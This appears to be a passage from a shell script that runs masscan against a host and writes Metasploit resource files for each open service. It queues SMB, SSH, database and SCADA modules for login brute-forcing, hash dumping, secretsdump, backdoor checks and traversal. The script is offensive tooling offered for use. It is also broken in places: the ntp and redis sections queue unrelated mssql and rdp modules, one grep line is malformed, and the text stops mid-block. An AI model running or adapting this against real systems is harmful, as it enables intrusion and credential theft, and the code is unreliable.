use auxiliary/scanner/portscan/ftpbounce
use auxiliary/scanner/portscan/syn
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/portscan/xmas
use auxiliary/scanner/quake/server_info
use auxiliary/scanner/rogue/rogue_recv
use auxiliary/scanner/rogue/rogue_send
use auxiliary/scanner/rservices/rexec_login
use auxiliary/scanner/rservices/rlogin_login
use auxiliary/scanner/rservices/rsh_login
use auxiliary/scanner/rsync/modules_list
use auxiliary/scanner/steam/server_info
use auxiliary/scanner/telephony/wardial
use auxiliary/scanner/teradata/teradata_odbc_login
use auxiliary/scanner/udp/udp_amplification
use auxiliary/scanner/upnp/ssdp_amp
use auxiliary/scanner/upnp/ssdp_msearch
use auxiliary/scanner/varnish/varnish_cli_file_read
use auxiliary/scanner/varnish/varnish_cli_login
use auxiliary/scanner/vmware/esx_fingerprint
use auxiliary/scanner/vmware/vmauthd_login
use auxiliary/scanner/vmware/vmauthd_version
use auxiliary/scanner/vmware/vmware_enum_permissions
use auxiliary/scanner/vmware/vmware_enum_sessions
use auxiliary/scanner/vmware/vmware_enum_users
use auxiliary/scanner/vmware/vmware_enum_vms
use auxiliary/scanner/vmware/vmware_host_details
use auxiliary/scanner/vmware/vmware_http_login
use auxiliary/scanner/vmware/vmware_screenshot_stealer
use auxiliary/scanner/vmware/vmware_server_dir_trav
use auxiliary/scanner/vmware/vmware_update_manager_traversal
use auxiliary/scanner/vnc/ard_root_pw
use auxiliary/scanner/vnc/vnc_login
use auxiliary/scanner/vnc/vnc_none_auth
use auxiliary/scanner/voice/recorder
use auxiliary/scanner/vxworks/wdbrpc_bootline
use auxiliary/scanner/vxworks/wdbrpc_version
use auxiliary/scanner/winrm/winrm_auth_methods
use auxiliary/scanner/winrm/winrm_cmd
use auxiliary/scanner/winrm/winrm_login
use auxiliary/scanner/winrm/winrm_wql
use auxiliary/scanner/wproxy/att_open_proxy
use auxiliary/scanner/wsdd/wsdd_query
use auxiliary/scanner/x11/open_x11
portscan
#masscan -p0-65535 $lhost --rate=5000 #grep "open" 1.txt # grep -o '[0-9]\{4\}'
masscan -p0-65535 192.168.80.128 --rate=5000 | grep open | awk '{print $4}' | tr -d [:alpha:] | tr -d / > ip.txt
var=$(cat ip.txt)
	if echo "${var[@]}" | grep -w "445" &>/dev/null; then
	echo "msf Start scanner:\n"
	echo "use auxiliary/scanner/smb/smb_ms17_010" >> smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >> smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/smb_login" >> smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >> smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/impacket/dcomexec" >> smb.rc
	echo "set RHOSTS $RHOSTS" >>smb.rc
	echo "exploit" >> smb.rc
	echo "back" >>smb.rc
	echo "use auxiliary/scanner/smb/smb1" >> smb.rc
	echo "set RHOSTS $RHOSTS" >>smb.rc
	echo "exploit" >> smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/smb2" >> smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >> smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/impacket/secretsdump" >> smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >> smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/smb_lookupsid" >> smb.rc
	echo "set RHOSTS $RHOSTS" >>smb.rc
	echo "exploit" >> smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/impacket/wmiexec" >> smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >> smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/smb_enum_gpp" >> smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >> smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/pipe_auditor" >> smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >> smb.rc
	echo "back" >>smb.rc
	echo "use auxiliary/scanner/smb/smb_enumshares" >> smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >> smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/smb_uninit_cred" >>smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >>smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/pipe_dcerpc_auditor" >>smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >>smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/smb_enumusers" >> smb.rc
	echo "set RHOSTS $RHOSTS" >>smb.rc
	echo "exploit" >>smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/smb_version" >> smb.rc
	echo "set RHOSTS $RHOSTS" >>smb.rc
	echo "exploit" >>smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/psexec_loggedin_users" >> smb.rc
	echo "set RHOSTS $RHOSTS" >> smb.rc
	echo "exploit" >>smb.rc
	echo "back" >> smb.rc
	echo "use auxiliary/scanner/smb/smb_enumusers_domain" >> smb.rc
	echo "set RHOSTS $RHOSTS" >>smb.rc
	echo "exploit" >>smb.rc
	echo "back" >>smb.rc
	fi
#smb脚本文件注释
<<smb
use auxiliary/scanner/smb/impacket/dcomexec      use auxiliary/scanner/smb/smb1                   use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/impacket/secretsdump   use auxiliary/scanner/smb/smb2                   use auxiliary/scanner/smb/smb_lookupsid
use auxiliary/scanner/smb/impacket/wmiexec       use auxiliary/scanner/smb/smb_enum_gpp           use auxiliary/scanner/smb/smb_ms17_05
use auxiliary/scanner/smb/pipe_auditor           use auxiliary/scanner/smb/smb_enumshares         use auxiliary/scanner/smb/smb_uninit_cred
use auxiliary/scanner/smb/pipe_dcerpc_auditor    use auxiliary/scanner/smb/smb_enumusers          use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/psexec_loggedin_users  use auxiliary/scanner/smb/smb_enumusers_domain
smb
	#ftp
	if echo "${var[@]}" | grep -w "21" &>/dev/null; then
	echo "use auxiliary/scanner/ftp/anonymous" >> ftp.rc
	echo "set RHOSTS $RHOSTS" >>ftp.rc
	echo "exploit" >>ftp.rc
	echo "back" >>ftp.rc
	echo "use auxiliary/scanner/ftp/easy_file_sharing_ftp" >> ftp.rc
	echo "set RHOSTS $RHOSTS" >>ftp.rc
	echo "exploit" >>ftp.rc
	echo "back" >>ftp.rc
	echo "use auxiliary/scanner/ftp/konica_ftp_traversal" >> ftp.rc
	echo "set RHOSTS $RHOSTS" >>ftp.rc
	echo "exploit" >>ftp.rc
	echo "back" >>ftp.rc
	echo "use auxiliary/scanner/ftp/bison_ftp_traversal " >> ftp.rc
	echo "set RHOSTS $RHOSTS" >>ftp.rc
	echo "exploit" >>ftp.rc
	echo "back" >>ftp.rc	
	echo "use auxiliary/scanner/ftp/ftp_login" >> ftp.rc
	echo "set RHOSTS $RHOSTS" >>ftp.rc
	echo "exploit" >>ftp.rc
	echo "back" >>ftp.rc
	echo "use auxiliary/scanner/ftp/pcman_ftp_traversal" >> ftp.rc
	echo "set RHOSTS $RHOSTS" >>ftp.rc
	echo "exploit" >>ftp.rc
	echo "back" >>ftp.rc
	echo "use auxiliary/scanner/ftp/colorado_ftp_traversal" >> ftp.rc
	echo "set RHOSTS $RHOSTS" >>ftp.rc
	echo "exploit" >>ftp.rc
	echo "back" >>ftp.rc
	echo "use auxiliary/scanner/ftp/ftp_version" >> ftp.rc
	echo "set RHOSTS $RHOSTS" >>ftp.rc
	echo "exploit" >>ftp.rc
	echo "back" >>ftp.rc
	echo "use auxiliary/scanner/ftp/titanftp_xcrc_traversal" >> ftp.rc
	echo "set RHOSTS $RHOSTS" >>ftp.rc
	echo "exploit" >>ftp.rc
	echo "back" >>ftp.rc
#ftp脚本文件注释
<<ftp
use auxiliary/scanner/ftp/anonymous                use auxiliary/scanner/ftp/easy_file_sharing_ftp    use auxiliary/scanner/ftp/konica_ftp_traversal
use auxiliary/scanner/ftp/bison_ftp_traversal      use auxiliary/scanner/ftp/ftp_login                use auxiliary/scanner/ftp/pcman_ftp_traversal
use auxiliary/scanner/ftp/colorado_ftp_traversal   use auxiliary/scanner/ftp/ftp_version              use auxiliary/scanner/ftp/titanftp_xcrc_traversal
ftp
	fi
	#telnet
	if echo "${var[@]}" | grep -w "23" &>/dev/null; then
	echo "use auxiliary/scanner/telnet/brocade_enable_login" >> telnet.rc
	echo "set RHOSTS $RHOSTS" >>telnet.rc
	echo "exploit" >>telnet.rc
	echo "back" >>telnet.rc
	echo "use auxiliary/scanner/telnet/telnet_encrypt_overflow" >> telnet.rc
	echo "set RHOSTS $RHOSTS" >>telnet.rc
	echo "exploit" >>telnet.rc
	echo "back" >>telnet.rc
	echo "use auxiliary/scanner/telnet/lantronix_telnet_password" >> telnet.rc
	echo "set RHOSTS $RHOSTS" >>telnet.rc
	echo "exploit" >>telnet.rc
	echo "back" >>telnet.rc
	echo "use auxiliary/scanner/telnet/telnet_login" >> telnet.rc
	echo "set RHOSTS $RHOSTS" >>telnet.rc
	echo "exploit" >>telnet.rc
	echo "back" >>telnet.rc
	echo "use auxiliary/scanner/telnet/lantronix_telnet_version" >> telnet.rc
	echo "set RHOSTS $RHOSTS" >>telnet.rc
	echo "exploit" >>telnet.rc
	echo "back" >>telnet.rc
	echo "use auxiliary/scanner/telnet/telnet_ruggedcom" >> telnet.rc
	echo "set RHOSTS $RHOSTS" >>telnet.rc
	echo "exploit" >>telnet.rc
	echo "back" >>telnet.rc
	echo "use auxiliary/scanner/telnet/satel_cmd_exec" >> telnet.rc
	echo "set RHOSTS $RHOSTS" >>telnet.rc
	echo "exploit" >>telnet.rc
	echo "back" >>telnet.rc
	echo "use auxiliary/scanner/telnet/telnet_version" >> telnet.rc
	echo "set RHOSTS $RHOSTS" >>telnet.rc
	echo "exploit" >>telnet.rc
	echo "back" >>telnet.rc
<<telnet	
use auxiliary/scanner/telnet/brocade_enable_login       use auxiliary/scanner/telnet/telnet_encrypt_overflow
use auxiliary/scanner/telnet/lantronix_telnet_password  use auxiliary/scanner/telnet/telnet_login
use auxiliary/scanner/telnet/lantronix_telnet_version   use auxiliary/scanner/telnet/telnet_ruggedcom
use auxiliary/scanner/telnet/satel_cmd_exec             use auxiliary/scanner/telnet/telnet_version
telnet
	fi
	#ssh
	if echo "${var[@]}" | grep -w "22" &>/dev/null; then
	echo "use auxiliary/scanner/ssh/apache_karaf_command_execution" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/cerberus_sftp_enumusers" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/detect_kippo" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/fortinet_backdoor" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/juniper_backdoor" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/karaf_login" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/ssh_enumusers" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/ssh_identify_pubkeys" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/ssh_login" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/ssh_login_pubkey" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "use auxiliary/scanner/ssh/ssh_version" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
	echo "" >> ssh.rc
	echo "set RHOSTS $RHOSTS" >>ssh.rc
	echo "exploit" >>ssh.rc
	echo "back" >>ssh.rc
<<ssh	
use auxiliary/scanner/ssh/apache_karaf_command_execution  use auxiliary/scanner/ssh/ssh_enumusers
use auxiliary/scanner/ssh/cerberus_sftp_enumusers         use auxiliary/scanner/ssh/ssh_identify_pubkeys
use auxiliary/scanner/ssh/detect_kippo                    use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/fortinet_backdoor               use auxiliary/scanner/ssh/ssh_login_pubkey
use auxiliary/scanner/ssh/juniper_backdoor                use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/karaf_login  
ssh
	fi
	#smtp
	if echo "${var[@]}" | grep -w "25" &>/dev/null; then
	echo "use auxiliary/scanner/smtp/smtp_enum" >> smtp.rc
	echo "set RHOSTS $RHOSTS" >>smtp.rc
	echo "exploit" >>smtp.rc
	echo "back" >>smtp.rc
	echo "use auxiliary/scanner/smtp/smtp_ntlm_domain" >> smtp.rc
	echo "set RHOSTS $RHOSTS" >>smtp.rc
	echo "exploit" >>smtp.rc
	echo "back" >>smtp.rc
	echo "use auxiliary/scanner/smtp/smtp_relay" >> smtp.rc
	echo "set RHOSTS $RHOSTS" >>smtp.rc
	echo "exploit" >>smtp.rc
	echo "back" >>smtp.rc
	echo "use auxiliary/scanner/smtp/smtp_version" >> smtp.rc
	echo "set RHOSTS $RHOSTS" >>smtp.rc
	echo "exploit" >>smtp.rc
	echo "back" >>smtp.rc
	echo "" >> smtp.rc
	echo "set RHOSTS $RHOSTS" >>smtp.rc
	echo "exploit" >>smtp.rc
	echo "back" >>smtp.rc
<<smtp	
use auxiliary/scanner/smtp/smtp_enum
use auxiliary/scanner/smtp/smtp_ntlm_domain
use auxiliary/scanner/smtp/smtp_relay
use auxiliary/scanner/smtp/smtp_version
smtp
	fi
	#tftp
	if echo "${var[@]}" | grep -w "69" &>/dev/null; then
	echo "use auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp" >> tftp.rc
	echo "set RHOSTS $RHOSTS" >>tftp.rc
	echo "exploit" >>tftp.rc
	echo "back" >>tftp.rc
	echo "use auxiliary/scanner/tftp/netdecision_tftp" >> tftp.rc
	echo "set RHOSTS $RHOSTS" >>tftp.rc
	echo "exploit" >>tftp.rc
	echo "back" >>tftp.rc
	echo "use auxiliary/scanner/tftp/tftpbrute" >> tftp.rc
	echo "set RHOSTS $RHOSTS" >>tftp.rc
	echo "exploit" >>tftp.rc
	echo "back" >>tftp.rc
	echo "" >> tftp.rc
	echo "set RHOSTS $RHOSTS" >>tftp.rc
	echo "exploit" >>tftp.rc
	echo "back" >>tftp.rc
<<tftp	
use auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp
use auxiliary/scanner/tftp/netdecision_tftp
use auxiliary/scanner/tftp/tftpbrute
tftp
	fi
	#pop3
	if echo "${var[@]}" | grep -w "110" &>/dev/null; then
	echo "use auxiliary/scanner/pop3/pop3_login" >> pop3.rc
	echo "set RHOSTS $RHOSTS" >>pop3.rc
	echo "exploit" >>pop3.rc
	echo "back" >>pop3.rc
	echo "use auxiliary/scanner/pop3/pop3_version" >> pop3.rc
	echo "set RHOSTS $RHOSTS" >>pop3.rc
	echo "exploit" >>pop3.rc
	echo "back" >>pop3.rc
<<pop3
use auxiliary/scanner/pop3/pop3_login
use auxiliary/scanner/pop3/pop3_version
pop3
	fi
	#mysql
	if echo "${var[@]}" | grep -w "3306" &>/dev/null; then
	echo "use auxiliary/scanner/mysql/mysql_authbypass_hashdump" >> mysql.rc
	echo "set RHOSTS $RHOSTS" >>mysql.rc
	echo "exploit" >>mysql.rc
	echo "back" >>mysql.rc
	echo "use auxiliary/scanner/mysql/mysql_file_enum" >> mysql.rc
	echo "set RHOSTS $RHOSTS" >>mysql.rc
	echo "exploit" >>mysql.rc
	echo "back" >>mysql.rc
	echo "use auxiliary/scanner/mysql/mysql_hashdump" >> mysql.rc
	echo "set RHOSTS $RHOSTS" >>mysql.rc
	echo "exploit" >>mysql.rc
	echo "back" >>mysql.rc
	echo "use auxiliary/scanner/mysql/mysql_login" >> mysql.rc
	echo "set RHOSTS $RHOSTS" >>mysql.rc
	echo "exploit" >>mysql.rc
	echo "back" >>mysql.rc
	echo "use auxiliary/scanner/mysql/mysql_schemadump" >> mysql.rc
	echo "set RHOSTS $RHOSTS" >>mysql.rc
	echo "exploit" >>mysql.rc
	echo "back" >>mysql.rc
	echo "use auxiliary/scanner/mysql/mysql_version" >> mysql.rc
	echo "set RHOSTS $RHOSTS" >>mysql.rc
	echo "exploit" >>mysql.rc
	echo "back" >>mysql.rc
	echo "use auxiliary/scanner/mysql/mysql_writable_dirs" >> mysql.rc
	echo "set RHOSTS $RHOSTS" >>mysql.rc
	echo "exploit" >>mysql.rc
	echo "back" >>mysql.rc
<<mysql	
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_writable_dirs
mysql
	fi
	#oracle
	if echo "${var[@]}" | (grep -w "2100" -o  grep -w "1158" -o grep -w "8080") &>/dev/null; then #1158,8080,2100
	echo "use auxiliary/scanner/oracle/emc_sid" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/isqlplus_login" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/isqlplus_sidbrute" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/oracle_hashdump" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/oracle_login" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/sid_brute" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/sid_enum" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/spy_sid" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/tnslsnr_version" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/tnspoison_checker" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/xdb_sid" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
	echo "use auxiliary/scanner/oracle/xdb_sid_brute" >> oracle.rc
	echo "set RHOSTS $RHOSTS" >>oracle.rc
	echo "exploit" >>oracle.rc
	echo "back" >>oracle.rc
<<oracle	
use auxiliary/scanner/oracle/emc_sid
use auxiliary/scanner/oracle/isqlplus_login
use auxiliary/scanner/oracle/isqlplus_sidbrute
use auxiliary/scanner/oracle/oracle_hashdump
use auxiliary/scanner/oracle/oracle_login
use auxiliary/scanner/oracle/sid_brute
use auxiliary/scanner/oracle/sid_enum
use auxiliary/scanner/oracle/spy_sid
use auxiliary/scanner/oracle/tnslsnr_version
use auxiliary/scanner/oracle/tnspoison_checker
use auxiliary/scanner/oracle/xdb_sid
use auxiliary/scanner/oracle/xdb_sid_brute
oracle
	fi
	#mssql
	if echo "${var[@]}" | grep -w "1433" &>/dev/null; then #MS SQL*SERVER数据库server，默认的端口号为1433/tcp 1433/udp，MS SQL*SERVER数据库monitor，默认的端口号为1434/tcp 1434/udp
	echo "use auxiliary/scanner/mssql/mssql_hashdump" >> mssql.rc
	echo "set RHOSTS $RHOSTS" >>mssql.rc
	echo "exploit" >>mssql.rc
	echo "back" >>mssql.rc
	echo "use auxiliary/scanner/mssql/mssql_login" >> mssql.rc
	echo "set RHOSTS $RHOSTS" >>mssql.rc
	echo "exploit" >>mssql.rc
	echo "back" >>mssql.rc
	echo "use auxiliary/scanner/mssql/mssql_ping" >> mssql.rc
	echo "set RHOSTS $RHOSTS" >>mssql.rc
	echo "exploit" >>mssql.rc
	echo "back" >>mssql.rc
	echo "use auxiliary/scanner/mssql/mssql_schemadump" >> mssql.rc
	echo "set RHOSTS $RHOSTS" >>mssql.rc
	echo "exploit" >>mssql.rc
	echo "back" >>mssql.rc
	echo "" >> mssql.rc
	echo "set RHOSTS $RHOSTS" >>mssql.rc
	echo "exploit" >>mssql.rc
	echo "back" >>mssql.rc
<<mssql	
use auxiliary/scanner/mssql/mssql_hashdump
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_schemadump
mssql
	fi
	#ntp
	if echo "${var[@]}" | grep -w "123" &>/dev/null; then
	echo "use auxiliary/scanner/mssql/mssql_hashdump" >> ntp.rc
	echo "set RHOSTS $RHOSTS" >>ntp.rc
	echo "exploit" >>ntp.rc
	echo "back" >>ntp.rc
	echo "use auxiliary/scanner/mssql/mssql_login" >> ntp.rc
	echo "set RHOSTS $RHOSTS" >>ntp.rc
	echo "exploit" >>ntp.rc
	echo "back" >>ntp.rc
	echo "use auxiliary/scanner/mssql/mssql_ping" >> ntp.rc
	echo "set RHOSTS $RHOSTS" >>ntp.rc
	echo "exploit" >>ntp.rc
	echo "back" >>ntp.rc
	echo "use auxiliary/scanner/mssql/mssql_schemadump" >> ntp.rc
	echo "set RHOSTS $RHOSTS" >>ntp.rc
	echo "exploit" >>ntp.rc
	echo "back" >>ntp.rc
<<ntp	
use auxiliary/scanner/ntp/ntp_monlist
use auxiliary/scanner/ntp/ntp_nak_to_the_future
use auxiliary/scanner/ntp/ntp_peer_list_dos
use auxiliary/scanner/ntp/ntp_peer_list_sum_dos
use auxiliary/scanner/ntp/ntp_readvar
use auxiliary/scanner/ntp/ntp_req_nonce_dos
use auxiliary/scanner/ntp/ntp_reslist_dos
use auxiliary/scanner/ntp/ntp_unsettrap_dos
ntp
	fi
	#pcanywhere
	if echo "${var[@]}" | grep -w "5631" &>/dev/null; then
	echo "use auxiliary/scanner/pcanywhere/pcanywhere_login" >> pcanywhere.rc
	echo "set RHOSTS $RHOSTS" >>pcanywhere.rc
	echo "exploit" >>pcanywhere.rc
	echo "back" >>pcanywhere.rc
	echo "use auxiliary/scanner/pcanywhere/pcanywhere_tcp" >> pcanywhere.rc
	echo "set RHOSTS $RHOSTS" >>pcanywhere.rc
	echo "exploit" >>pcanywhere.rc
	echo "back" >>pcanywhere.rc
	echo "use auxiliary/scanner/pcanywhere/pcanywhere_udp" >> pcanywhere.rc
	echo "set RHOSTS $RHOSTS" >>pcanywhere.rc
	echo "exploit" >>pcanywhere.rc
	echo "back" >>pcanywhere.rc
<<pcanywhere	
use auxiliary/scanner/pcanywhere/pcanywhere_login
use auxiliary/scanner/pcanywhere/pcanywhere_tcp
use auxiliary/scanner/pcanywhere/pcanywhere_udp
pcanywhere
	fi
	#postgres
	if echo "${var[@]}" | grep -w "5432" &>/dev/null; then
	echo "use auxiliary/scanner/postgres/postgres_dbname_flag_injection" >> postgres.rc
	echo "set RHOSTS $RHOSTS" >>postgres.rc
	echo "exploit" >>postgres.rc
	echo "back" >>postgres.rc
	echo "use auxiliary/scanner/postgres/postgres_hashdump" >> postgres.rc
	echo "set RHOSTS $RHOSTS" >>postgres.rc
	echo "exploit" >>postgres.rc
	echo "back" >>postgres.rc
	echo "use auxiliary/scanner/postgres/postgres_login" >> postgres.rc
	echo "set RHOSTS $RHOSTS" >>postgres.rc
	echo "exploit" >>postgres.rc
	echo "back" >>postgres.rc
	echo "use auxiliary/scanner/postgres/postgres_schemadump" >> postgres.rc
	echo "set RHOSTS $RHOSTS" >>postgres.rc
	echo "exploit" >>postgres.rc
	echo "back" >>postgres.rc
	echo "use auxiliary/scanner/postgres/postgres_version" >> postgres.rc
	echo "set RHOSTS $RHOSTS" >>postgres.rc
	echo "exploit" >>postgres.rc
	echo "back" >>postgres.rc
<<postgres	
use auxiliary/scanner/postgres/postgres_dbname_flag_injection
use auxiliary/scanner/postgres/postgres_hashdump
use auxiliary/scanner/postgres/postgres_login
use auxiliary/scanner/postgres/postgres_schemadump
use auxiliary/scanner/postgres/postgres_version
postgres
	fi
	#rdp
	if echo "${var[@]}" | grep -w "3389" &>/dev/null; then
	echo "use auxiliary/scanner/rdp/ms12_020_check" >> rdp.rc
	echo "set RHOSTS $RHOSTS" >>rdp.rc
	echo "exploit" >>rdp.rc
	echo "back" >>rdp.rc
	echo "use auxiliary/scanner/rdp/rdp_scanner" >> rdp.rc
	echo "set RHOSTS $RHOSTS" >>rdp.rc
	echo "exploit" >>rdp.rc
	echo "back" >>rdp.rc
	echo "" >> rdp.rc
	echo "set RHOSTS $RHOSTS" >>rdp.rc
	echo "exploit" >>rdp.rc
	echo "back" >>rdp.rc
<<rdp	
use auxiliary/scanner/rdp/ms12_020_check
use auxiliary/scanner/rdp/rdp_scanner
rdp
	fi
	#redis
	if echo "${var[@]}" | grep -w "6379" &>/dev/null; then
	echo "use auxiliary/scanner/rdp/ms12_020_check" >> redis.rc
	echo "set RHOSTS $RHOSTS" >>redis.rc
	echo "exploit" >>redis.rc
	echo "back" >>redis.rc
	echo "use auxiliary/scanner/rdp/rdp_scanner" >> redis.rc
	echo "set RHOSTS $RHOSTS" >>redis.rc
	echo "exploit" >>redis.rc
	echo "back" >>redis.rc
	echo "" >> redis.rc
	echo "set RHOSTS $RHOSTS" >>redis.rc
	echo "exploit" >>redis.rc
	echo "back" >>redis.rc
<<redis	
use auxiliary/scanner/redis/file_upload
use auxiliary/scanner/redis/redis_login
use auxiliary/scanner/redis/redis_server
redis
	fi
	#scada
	if echo "${var[@]}" | grep -w "1883" &>/dev/null; then
	echo "use auxiliary/scanner/scada/digi_addp_reboot" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/digi_addp_version" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/digi_realport_serialport_scan" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/digi_realport_version" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/indusoft_ntwebserver_fileaccess" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/koyo_login" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/modbus_findunitid" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/modbusclient" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/modbusdetect" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/moxa_discover" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/profinet_siemens" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
	echo "use auxiliary/scanner/scada/sielco_winlog_fileaccess" >> scada.rc
	echo "set RHOSTS $RHOSTS" >>scada.rc
	echo "exploit" >>scada.rc
	echo "back" >>scada.rc
<<scada	
use auxiliary/scanner/scada/digi_addp_reboot
use auxiliary/scanner/scada/digi_addp_version
